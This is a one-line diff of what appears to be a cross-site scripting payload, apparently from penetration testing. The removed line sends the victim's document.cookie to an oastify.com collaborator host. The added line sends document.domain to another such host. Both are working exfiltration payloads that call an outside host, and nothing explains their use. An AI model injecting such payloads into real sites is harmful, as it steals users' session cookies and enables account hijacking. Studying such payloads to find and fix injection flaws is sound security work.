@@ -1,1 +1,1 @@
-document.location='https://2vysozjw3rj8np9yyw4g4iz0erki8gw5.oastify.com?c='+document.cookie
+document.location='https://rqlalpkvc4xp4qtuex4ty52980er2lqa.oastify.com?c='+document.domain
